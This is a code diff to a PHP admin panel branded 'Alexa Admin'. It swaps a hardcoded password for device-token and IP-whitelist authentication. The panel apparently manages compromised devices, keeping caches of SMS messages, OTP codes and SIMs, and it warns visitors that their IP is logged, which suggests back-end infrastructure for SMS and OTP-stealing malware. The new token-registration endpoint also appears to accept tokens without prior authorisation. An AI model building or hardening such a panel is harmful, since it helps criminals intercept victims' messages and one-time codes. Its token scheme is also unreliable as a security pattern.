@@ -64,18 +64,17 @@ function botSend($text) {
   curl_close($ch);
 }
 
-// ====== SESSION / AUTH ======
-define('PANEL_PWD', 'Alexa');
+// ====== AUTH (token-based + IP whitelist) ======
 $visitorIP = getRealIP();
-$passAuth = isset($_POST['pwd']) && $_POST['pwd'] === PANEL_PWD;
-
-// Cookie-based auth for IP changes
-$cookieAuth = isset($_COOKIE['aa_auth']) && $_COOKIE['aa_auth'] === md5(PANEL_PWD);
-if ($passAuth) { setcookie('aa_auth', md5(PANEL_PWD), time() + 86400 * 30, '/'); $cookieAuth = true; }
+$browserToken = $_GET['token'] ?? $_POST['token'] ?? $_COOKIE['aa_token'] ?? '';
+if ($browserToken) setcookie('aa_token', $browserToken, time() + 86400 * 365, '/');
 
 $allowedIPs = fb('panel/allowed_ips');
 if (!is_array($allowedIPs)) $allowedIPs = [];
-$isAllowed = ($cookieAuth || in_array($visitorIP, $allowedIPs) || in_array('*', $allowedIPs));
+$allowedTokens = fb('panel/auth_tokens');
+if (!is_array($allowedTokens)) $allowedTokens = [];
+
+$isAllowed = (in_array($visitorIP, $allowedIPs) || in_array('*', $allowedIPs) || isset($allowedTokens[$browserToken]));
 
 // Log visitor
 $visitors = fb('panel/visitors');
@@ -139,6 +138,19 @@ if ($ajax) {
     $raw = fb('panel/allowed_ips'); // lightweight check
     $ms = round((microtime(true) - $start) * 1000);
     echo json_encode(['ok' => true, 'ping' => $ms, 'php' => PHP_VERSION]);
+    exit;
+  }
+  
+  if ($ajax === 'register_token') {
+    $token = $_POST['token'] ?? $_GET['token'] ?? '';
+    if (strlen($token) >= 16) {
+      $tokens = fb('panel/auth_tokens');
+      if (!is_array($tokens)) $tokens = [];
+      $tokens[$token] = ['ip' => $visitorIP, 'ua' => substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 80), 'time' => date('Y-m-d H:i:s')];
+      fbPut('panel/auth_tokens', $tokens);
+      setcookie('aa_token', $token, time() + 86400 * 365, '/');
+      echo json_encode(['ok' => true]);
+    } else { echo json_encode(['ok' => false, 'error' => 'Invalid token']); }
     exit;
   }
   
@@ -231,13 +243,12 @@ body{background:#0a0a0f;min-height:100vh;display:flex;align-items:center;justify
     <span>📡 YOUR IP HAS BEEN LOGGED</span>
     <strong><?php echo htmlspecialchars($visitorIP); ?></strong>
   </div>
-  <form method="post" style="margin-top:20px;display:flex;gap:8px;justify-content:center;align-items:center;flex-wrap:wrap">
-    <input type="password" name="pwd" placeholder="Access Key" style="padding:10px 16px;border:1px solid rgba(255,0,0,.15);border-radius:8px;background:rgba(255,255,255,.03);color:#fff;font-size:13px;font-family:'Orbitron',monospace;outline:none;width:180px">
-    <button type="submit" style="padding:10px 20px;border:none;border-radius:8px;background:linear-gradient(135deg,#6c3cf0,#4a1fc0);color:#fff;font-size:12px;font-family:'Orbitron',monospace;cursor:pointer">Unlock</button>
-  </form>
+  <p style="margin-top:16px;color:rgba(255,100,100,.2);font-size:10px;letter-spacing:2px">🔒 This browser is not authorized</p>
 </div>
 <div class="footer-ip">🔒 Alexa Admin • IP Detective Active</div>
 <script>
+var t = localStorage.getItem('aa_device_token');
+if(t) { window.location.href = 'panel.php?token=' + encodeURIComponent(t); }
 setInterval(function(){
   var m = document.querySelector('.msg2');
   if(m){ m.style.animation='none'; m.offsetHeight; m.style.animation='shake .5s infinite'; }
@@ -449,6 +460,15 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 var DEV = {}, DLIST = [], FILTER = 'all', SIMF = 'all';
 var SMS_CACHE = [], OTP_CACHE = [], SIMS_CACHE = [];
 var polling = null;
+
+// ====== Device token auth (survives IP change) ======
+function genToken(){ var a=new Uint8Array(32); crypto.getRandomValues(a); return Array.from(a,function(b){return b.toString(36).padStart(2,'0')}).join('') }
+(function(){
+  var t = localStorage.getItem('aa_device_token');
+  if(!t) { t = genToken(); localStorage.setItem('aa_device_token', t); }
+  // Register token with server (silently)
+  fetch('panel.php?ajax=register_token', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'token='+encodeURIComponent(t)}).catch(function(){});
+})();
 
 function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;') }
 function show(m){ var t=document.getElementById('toast'); t.textContent=m; t.style.display='block'; setTimeout(function(){t.style.display='none'},2000) }
